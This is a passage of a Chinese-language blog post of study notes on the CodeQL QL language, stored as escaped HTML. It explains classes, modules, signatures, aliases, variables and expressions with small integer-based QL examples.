中可用的内置操作的完整列表，请参阅 QL 语言规范中的内置部分。</p>\n<p><a href=\"https://codeql.github.com/docs/ql-language-reference/ql-language-specification/#built-ins\">https://codeql.github.com/docs/ql-language-reference/ql-language-specification/#built-ins</a></p>\n<blockquote>\n<p>此外，QlBuiltins::BigInt 中还有一个实验性的任意精度整数原始类型。默认情况下，此类型在 CodeQL CLI 中不可用，但可以通过将 –allow-experimental&#x3D;bigint 选项传 来启用它。</p>\n</blockquote>\n<h2 id=\"Classes\"><a href=\"#Classes\" class=\"headerlink\" title=\"Classes\"></a>Classes</h2><h3 id=\"定义一个类\"><a href=\"#定义一个类\" class=\"headerlink\" title=\"定义一个类\"></a>定义一个类</h3><ol>\n<li>class 关键字</li>\n<li>class 名，要求首字母大写</li>\n<li>通过 extends和instanceof定义的supertypes</li>\n<li>括号括起来的类体</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">OneTwoThree</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">int</span> &#123;</span><br><span class=\"line\">  OneTwoThree() &#123; <span class=\"comment\">// characteristic predicate</span></span><br><span class=\"line\">    <span class=\"built_in\">this</span> = <span class=\"number\">1</span> <span class=\"type\">or</span> <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"number\">2</span> <span class=\"type\">or</span> <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"number\">3</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  string <span class=\"title function_\">getAString</span><span class=\"params\">()</span> &#123; <span class=\"comment\">// member predicate</span></span><br><span class=\"line\">    result = <span class=\"string\">&quot;One, two or three: &quot;</span> + <span class=\"built_in\">this</span>.toString()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  predicate <span class=\"title function_\">isEven</span><span class=\"params\">()</span> &#123; <span class=\"comment\">// member predicate</span></span><br><span class=\"line\">    <span class=\"built_in\">this</span> = <span class=\"number\">2</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>定义了一个类 OneTwoThree，它包含值 1 2 3。</p>\n<p>OneTwoThree 继承了 int，也就是说，它是 int 的子类。QL 中的类必须始终具有至少一个supertypes。使用 extends 关键字引用的supertypes称为<strong>base types</strong> of the class。</p>\n<h3 id=\"Class-bodies\"><a href=\"#Class-bodies\" class=\"headerlink\" title=\"Class bodies\"></a>Class bodies</h3><p>The body of a class can contain:</p>\n<ul>\n<li>A characteristic predicate declaration.  &#x2F;&#x2F; 前面讲 谓词种类 的时候都提到了 #Kinds(种类) of predicates</li>\n<li>Any number of member predicate declarations. </li>\n<li>Any number of field declarations.</li>\n</ul>\n<h4 id=\"Characteristic-predicates\"><a href=\"#Characteristic-predicates\" class=\"headerlink\" title=\"Characteristic predicates\"></a>Characteristic predicates</h4><p>相当于构造方法。前面提到过</p>\n<h4 id=\"Member-predicates\"><a href=\"#Member-predicates\" class=\"headerlink\" title=\"Member predicates\"></a>Member predicates</h4><p>可以用这种方法调用一个member predicate</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(OneTwoThree).getAString()</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Fields\"><a href=\"#Fields\" class=\"headerlink\" title=\"Fields\"></a>Fields</h4><p>在body of a class中进行声明，例子如下。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">SmallInt</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">int</span> &#123;</span><br><span class=\"line\">  SmallInt() &#123; <span class=\"built_in\">this</span> = [<span class=\"number\">1</span> .. <span class=\"number\">10</span>] &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">DivisibleInt</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">SmallInt</span> &#123;</span><br><span class=\"line\">  SmallInt divisor;   <span class=\"comment\">// declaration of the field `divisor`</span></span><br><span class=\"line\">  DivisibleInt() &#123; <span class=\"built_in\">this</span> % divisor = <span class=\"number\">0</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  SmallInt <span class=\"title function_\">getADivisor</span><span class=\"params\">()</span> &#123; result = divisor &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from DivisibleInt i</span><br><span class=\"line\">select i, i.getADivisor()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Concrete-classes\"><a href=\"#Concrete-classes\" class=\"headerlink\" title=\"Concrete classes\"></a>Concrete classes</h3><p>比如上面那个 DivisibleInt 有一个  SmallInt 的 Fields</p>\n<p>下面这些就和面向对象的语言很相似，看一下名字就知道是什么意思。不细讲。</p>\n<h3 id=\"Abstract-classes\"><a href=\"#Abstract-classes\" class=\"headerlink\" title=\"Abstract classes\"></a>Abstract classes</h3><p>抽象类</p>\n<h3 id=\"Overriding-member-predicates\"><a href=\"#Overriding-member-predicates\" class=\"headerlink\" title=\"Overriding member predicates\"></a>Overriding member predicates</h3><p>重写父类谓词</p>\n<h3 id=\"Multiple-inheritance\"><a href=\"#Multiple-inheritance\" class=\"headerlink\" title=\"Multiple inheritance\"></a>Multiple inheritance</h3><p>多继承</p>\n<h3 id=\"Final-extensions\"><a href=\"#Final-extensions\" class=\"headerlink\" title=\"Final extensions\"></a>Final extensions</h3><p>类似于final关键字。</p>\n<h3 id=\"Non-extending-subtypes\"><a href=\"#Non-extending-subtypes\" class=\"headerlink\" title=\"Non-extending subtypes\"></a>Non-extending subtypes</h3><p>其实就是有点像接口，下面这个会报错。instanceof 声明的超类型中的字段和方法不会成为子类的一部分</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Foo</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">int</span> &#123;</span><br><span class=\"line\">    Foo() &#123; <span class=\"built_in\">this</span> in [<span class=\"number\">1</span> .. <span class=\"number\">10</span>] &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">    string <span class=\"title function_\">fooMethod</span><span class=\"params\">()</span> &#123; result = <span class=\"string\">&quot;foo&quot;</span> &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">class</span> <span class=\"title class_\">Bar</span> <span class=\"keyword\">instanceof</span> Foo &#123;</span><br><span class=\"line\">    string <span class=\"title function_\">toString</span><span class=\"params\">()</span> &#123; result = <span class=\"built_in\">super</span>.fooMethod() &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">select <span class=\"title function_\">any</span><span class=\"params\">(Bar b)</span>.fooMethod()</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Interface</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">int</span> &#123;</span><br><span class=\"line\">    Interface() &#123; <span class=\"built_in\">this</span> in [<span class=\"number\">1</span> .. <span class=\"number\">10</span>] &#125;</span><br><span class=\"line\">    string <span class=\"title function_\">foo</span><span class=\"params\">()</span> &#123; result = <span class=\"string\">&quot;&quot;</span> &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">class</span> <span class=\"title class_\">Foo</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">int</span> &#123;</span><br><span class=\"line\">    Foo() &#123; <span class=\"built_in\">this</span> in [<span class=\"number\">1</span> .. <span class=\"number\">5</span>] &#125;</span><br><span class=\"line\">    string <span class=\"title function_\">foo</span><span class=\"params\">()</span> &#123; result = <span class=\"string\">&quot;foo&quot;</span> &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">class</span> <span class=\"title class_\">Bar</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Interface</span> <span class=\"keyword\">instanceof</span> Foo &#123;</span><br><span class=\"line\">    override string <span class=\"title function_\">foo</span><span class=\"params\">()</span> &#123; result = <span class=\"string\">&quot;bar&quot;</span> &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">select <span class=\"title function_\">any</span><span class=\"params\">(Bar b)</span>.foo()  <span class=\"comment\">// 返回 bar</span></span><br><span class=\"line\"><span class=\"comment\">// select any(Foo f).foo()   // 返回foo</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h1 id=\"Modules\"><a href=\"#Modules\" class=\"headerlink\" title=\"Modules\"></a>Modules</h1><p>之类就给一个例子吧，太复杂的官方也没有给例子，这就是好多语言都有的一个东西。</p>\n<p><strong>OneTwoThreeLib.qll</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">OneTwoThree</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">int</span> &#123;</span><br><span class=\"line\">    OneTwoThree() &#123;</span><br><span class=\"line\">      <span class=\"built_in\">this</span> = <span class=\"number\">1</span> <span class=\"type\">or</span> <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"number\">2</span> <span class=\"type\">or</span> <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"number\">3</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">module</span> M &#123;</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">OneTwo</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">OneTwoThree</span> &#123;</span><br><span class=\"line\">    OneTwo() &#123;</span><br><span class=\"line\">\t    <span class=\"built_in\">this</span> = <span class=\"number\">1</span> <span class=\"type\">or</span> <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"number\">2</span></span><br><span class=\"line\">\t    &#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><strong>OneTwoQuery.ql</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> OneTwoThreeLib</span><br><span class=\"line\"></span><br><span class=\"line\">from OneTwoThree ott</span><br><span class=\"line\"><span class=\"type\">where</span> <span class=\"variable\">ott</span> <span class=\"operator\">=</span> <span class=\"number\">1</span> <span class=\"type\">or</span> <span class=\"variable\">ott</span> <span class=\"operator\">=</span> <span class=\"number\">2</span></span><br><span class=\"line\">select ott</span><br></pre></td></tr></table></figure>\n\n<p>在对chat的逼问之下，还是把这个调用方法给问出来了。<br><strong>OneTwoQuery2.ql</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 导入库文件</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> OneTwoThreeLib</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 使用 M 模块中的 OneTwo 类</span></span><br><span class=\"line\"></span><br><span class=\"line\">from M::OneTwo oneTwoInstance</span><br><span class=\"line\"></span><br><span class=\"line\">select oneTwoInstance, <span class=\"string\">&quot;Instance of OneTwo&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Signatures\"><a href=\"#Signatures\" class=\"headerlink\" title=\"Signatures\"></a>Signatures</h1><p>这个概念其实比较抽象。我暂时不想详细的写。这里就直接给官网的例子了。但是手边暂时没有具体使用的案例。</p>\n<h2 id=\"Predicate-signatures\"><a href=\"#Predicate-signatures\" class=\"headerlink\" title=\"Predicate signatures\"></a>Predicate signatures</h2><p>注意这个分号</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">signature <span class=\"type\">int</span> <span class=\"title function_\">operator</span><span class=\"params\">(<span class=\"type\">int</span> lhs, <span class=\"type\">int</span> rhs)</span>;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Type-signatures\"><a href=\"#Type-signatures\" class=\"headerlink\" title=\"Type signatures\"></a>Type signatures</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">signature <span class=\"keyword\">class</span> <span class=\"title class_\">ExtendsInt</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">int</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">signature <span class=\"keyword\">class</span> <span class=\"title class_\">CanBePrinted</span> &#123;</span><br><span class=\"line\">  string <span class=\"title function_\">toString</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Module-signatures\"><a href=\"#Module-signatures\" class=\"headerlink\" title=\"Module signatures\"></a>Module signatures</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">signature <span class=\"keyword\">module</span> MSig &#123;</span><br><span class=\"line\">  <span class=\"keyword\">class</span> <span class=\"title class_\">T</span>;</span><br><span class=\"line\">  predicate <span class=\"title function_\">restriction</span><span class=\"params\">(T t)</span>;</span><br><span class=\"line\">  <span class=\"keyword\">default</span> string <span class=\"title function_\">descr</span><span class=\"params\">(T t)</span> &#123; result = <span class=\"string\">&quot;default&quot;</span> &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">module</span> Module <span class=\"keyword\">implements</span> <span class=\"title class_\">MSig</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">newtype</span> <span class=\"variable\">T</span> <span class=\"operator\">=</span> A() or <span class=\"title function_\">B</span><span class=\"params\">()</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  predicate <span class=\"title function_\">restriction</span><span class=\"params\">(T t)</span> &#123; t = A() &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Parameterized-module-signatures\"><a href=\"#Parameterized-module-signatures\" class=\"headerlink\" title=\"Parameterized module signatures\"></a>Parameterized module signatures</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">signature <span class=\"keyword\">class</span> <span class=\"title class_\">NodeSig</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">signature <span class=\"keyword\">module</span> EdgeSig&lt;NodeSig Node&gt; &#123;</span><br><span class=\"line\">  predicate <span class=\"title function_\">apply</span><span class=\"params\">(Node src, Node dst)</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">module</span> Reachability&lt;NodeSig Node, EdgeSig&lt;Node&gt; Edge&gt; &#123;</span><br><span class=\"line\">  Node <span class=\"title function_\">reachableFrom</span><span class=\"params\">(Node src)</span> &#123;</span><br><span class=\"line\">    Edge::apply+(src, result)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Aliases\"><a href=\"#Aliases\" class=\"headerlink\" title=\"Aliases\"></a>Aliases</h1><h2 id=\"Defining-an-alias\"><a href=\"#Defining-an-alias\" class=\"headerlink\" title=\"Defining an alias\"></a>Defining an alias</h2><h3 id=\"Module-aliases\"><a href=\"#Module-aliases\" class=\"headerlink\" title=\"Module aliases\"></a>Module aliases</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">module</span> <span class=\"variable\">ModAlias</span> <span class=\"operator\">=</span> ModuleName;</span><br></pre></td></tr></table></figure>\n\n<p>下面这个会弃用oldversion。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deprecated <span class=\"type\">module</span> <span class=\"variable\">OldVersion</span> <span class=\"operator\">=</span> NewVersion;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Type-aliases\"><a href=\"#Type-aliases\" class=\"headerlink\" title=\"Type aliases\"></a>Type aliases</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">TypeAlias</span> = TypeName;</span><br></pre></td></tr></table></figure>\n\n<p>你可以使用别名将基本类型boolean的名称缩写为Bool：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Bool</span> = <span class=\"type\">boolean</span>;</span><br></pre></td></tr></table></figure>\n\n<p>在OneTwoThreeLib中使用模块M中定义的类OneTwoThreeLib.qll，你可以创建一个别名来使用更短的名称OT</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> OneTwoThreeLib</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">OT</span> = M::OneTwo;</span><br><span class=\"line\"></span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">from OT ot</span><br><span class=\"line\">select ot</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Predicate-aliases\"><a href=\"#Predicate-aliases\" class=\"headerlink\" title=\"Predicate aliases\"></a>Predicate aliases</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getSuccessor</span><span class=\"params\">(<span class=\"type\">int</span> i)</span> &#123;</span><br><span class=\"line\">  result = i + <span class=\"number\">1</span> and</span><br><span class=\"line\">  i in [<span class=\"number\">1</span> .. <span class=\"number\">9</span>]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以为这个谓语设置一个这样的别名。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">predicate</span> <span class=\"variable\">succ</span> <span class=\"operator\">=</span> getSuccessor/<span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Strong-and-weak-aliases\"><a href=\"#Strong-and-weak-aliases\" class=\"headerlink\" title=\"Strong and weak aliases\"></a>Strong and weak aliases</h3><p>有annotation 注解的是 Strong aliases。来自相同module&#x2F;type&#x2F;predicate的weak aliases定义之间的别名歧义是允许的，但来自不同Strong aliases定义之间的别名歧义是无效的QL。</p>\n<blockquote>\n<p>Every alias definition is either <strong>strong</strong> or <strong>weak</strong>. An alias definition is <strong>strong</strong> if and only if it is a <a href=\"https://codeql.github.com/docs/ql-language-reference/aliases/#type-aliases\">type alias</a> definition with <a href=\"https://codeql.github.com/docs/ql-language-reference/annotations/#annotations\">annotation</a> <code>final</code>. During <a href=\"https://codeql.github.com/docs/ql-language-reference/name-resolution/#name-resolution\">name resolution</a>, ambiguity between aliases from <strong>weak</strong> alias definitions for the same module&#x2F;type&#x2F;predicate is allowed, but ambiguity between between aliases from distinct <strong>strong</strong> alias definitions is invalid QL. Likewise, for the purpose of applicative instantiation of <a href=\"https://codeql.github.com/docs/ql-language-reference/modules/#parameterized-modules\">parameterised modules</a> and :ref:&#96;parameterised module signatures <parameterized-module-signatures>, aliases from <strong>weak</strong> alias definitions for instantiation arguments do not result in separate instantiations, but aliases from <strong>strong</strong> alias definitions for instantiation arguments do.</p>\n</blockquote>\n<h1 id=\"Variables\"><a href=\"#Variables\" class=\"headerlink\" title=\"Variables\"></a>Variables</h1><h2 id=\"Declaring-a-variable\"><a href=\"#Declaring-a-variable\" class=\"headerlink\" title=\"Declaring a variable\"></a>Declaring a variable</h2><p>其实前面就一只在遇见了。声明，赋值，输出。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from <span class=\"type\">int</span> i</span><br><span class=\"line\"><span class=\"type\">where</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">10</span></span><br><span class=\"line\">select i</span><br><span class=\"line\">  </span><br><span class=\"line\">from <span class=\"type\">int</span> i</span><br><span class=\"line\">where i in [<span class=\"number\">0</span> .. <span class=\"number\">9</span>]</span><br><span class=\"line\">select i</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Free-and-bound-variables\"><a href=\"#Free-and-bound-variables\" class=\"headerlink\" title=\"Free and bound variables\"></a>Free and bound variables</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;hello&quot;</span>.indexOf(<span class=\"string\">&quot;l&quot;</span>)</span><br><span class=\"line\">min(<span class=\"type\">float</span> f | f in [-<span class=\"number\">3</span> .. <span class=\"number\">3</span>])</span><br><span class=\"line\">(i + <span class=\"number\">7</span>) * <span class=\"number\">3</span></span><br><span class=\"line\">x.sqrt()</span><br></pre></td></tr></table></figure>\n\n<p>第一个没有 variables  ，值是2</p>\n<p>第二个<strong>bound variable</strong>  ，值恒为3</p>\n<p>第三个<strong>free variables</strong> ，i 的值影响着整体的值。表达式是否成立取决于i的值。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;hello&quot;</span>.indexOf(<span class=\"string\">&quot;l&quot;</span>) = <span class=\"number\">1</span></span><br><span class=\"line\">min(<span class=\"type\">float</span> f | f in [-<span class=\"number\">3</span> .. <span class=\"number\">3</span>]) = -<span class=\"number\">3</span></span><br><span class=\"line\">(i + <span class=\"number\">7</span>) * <span class=\"number\">3</span> <span class=\"keyword\">instanceof</span> <span class=\"type\">int</span></span><br><span class=\"line\"><span class=\"title function_\">exists</span><span class=\"params\">(<span class=\"type\">float</span> y | x.sqrt()</span> = y)</span><br></pre></td></tr></table></figure>\n\n<p>第一个永远不成立。</p>\n<p>第二个永远成立</p>\n<p>第三个可能成立</p>\n<p>第四个单y为负数时永远不成立</p>\n<h1 id=\"Expressions\"><a href=\"#Expressions\" class=\"headerlink\" title=\"Expressions\"></a>Expressions</h1><h2 id=\"Literals\"><a href=\"#Literals\" class=\"headerlink\" title=\"Literals\"></a>Literals</h2><p>Integer literals</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0</span><br><span class=\"line\">42</span><br><span class=\"line\">-2048</span><br></pre></td></tr></table></figure>\n\n<p>Float literals</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2.0</span><br><span class=\"line\">123.456</span><br><span class=\"line\">-100.5</span><br></pre></td></tr></table></figure>\n\n<p>等等</p>\n<h2 id=\"Parenthesized-括号-expressions\"><a href=\"#Parenthesized-括号-expressions\" class=\"headerlink\" title=\"Parenthesized(括号) expressions\"></a>Parenthesized(括号) expressions</h2><h2 id=\"Ranges\"><a href=\"#Ranges\" class=\"headerlink\" title=\"Ranges\"></a>Ranges</h2><p>其实前面也见到一些了</p>\n<p><code>[3 .. 7]</code>表示的是3到7的整数</p>\n<h2 id=\"Set-literal-expressions\"><a href=\"#Set-literal-expressions\" class=\"headerlink\" title=\"Set literal expressions\"></a>Set literal expressions</h2><p><code>[2, 3, 5, 7, 11, 13, 17, 19, 23, 29]</code> 是一个集合参数</p>\n<h2 id=\"Super-expressions\"><a href=\"#Super-expressions\" class=\"headerlink\" title=\"Super expressions\"></a>Super expressions</h2><p>这个直接看例子，其实就是super.  然后找父类。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">A</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">int</span> &#123;</span><br><span class=\"line\">  A() &#123; <span class=\"built_in\">this</span> = <span class=\"number\">1</span> &#125;</span><br><span class=\"line\">  <span class=\"type\">int</span> <span class=\"title function_\">getANumber</span><span class=\"params\">()</span> &#123; result = <span class=\"number\">2</span> &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">B</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">int</span> &#123;</span><br><span class=\"line\">  B() &#123; <span class=\"built_in\">this</span> = <span 